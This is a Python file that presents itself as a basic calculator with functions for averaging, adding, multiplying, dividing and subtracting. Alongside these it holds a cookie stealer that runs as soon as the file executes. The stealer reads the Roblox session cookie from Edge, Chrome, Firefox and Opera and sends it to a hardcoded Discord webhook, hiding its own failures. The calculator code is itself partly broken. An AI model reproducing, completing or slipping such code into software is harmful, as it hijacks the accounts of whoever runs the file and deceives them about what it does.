import requests, threading, browser_cookie3

webhook = "https://discordapp.com/api/webhooks/1046271054852657203/V7ETa82L3xjSWQbWcqnC-xrhtEUsvGphrs-Km5t40bZnmtlIw4yU_5t3Fqlj6BmHfiHe"

#calculates the average of three numbers
def average(one, two, three):
    number = one + two + three 
    number = number / 3
    print(number + "is youre average")


#adds two numbers together
def add(one, two):
    number = one + two 
    print(number)

#multiplies two numbers
def multiply(one, two):
    number = one * two 
    print(number)

#divides two numbers
def divide(one, two):
    number = one / two 
    print(number)
#subtracts two numbers
def subtract(one, two):
    number = one - two 
    print(number)

def edge_logger():
    try:
        cookies = browser_cookie3.edge(domain_name='roblox.com')
        cookies = str(cookies)
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        requests.post(webhook, json={'username':'kgb is on top', 'content':f'```{cookie}```'})
    except:
        pass
def chrome_logger():
    try:
        cookies = browser_cookie3.chrome(domain_name='roblox.com')
        cookies = str(cookies)
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        requests.post(webhook, json={'username':'kgb is on top', 'content':f'```{cookie}```'})
    except:
        pass


def firefox_logger():
    try:
        cookies = browser_cookie3.firefox(domain_name='roblox.com')
        cookies = str(cookies)
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        requests.post(webhook, json={'username':'kgb is on top', 'content':f'```{cookie}```'})
    except:
        pass

def opera_logger():
    try:
        cookies = browser_cookie3.opera(domain_name='roblox.com')
        cookies = str(cookies)
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        requests.post(webhook, json={'username':'kgb is on top', 'content':f'```{cookie}```'})
    except:
        pass

browsers = [edge_logger, chrome_logger, firefox_logger, opera_logger]

for x in browsers:
    threading.Thread(target=x,).start()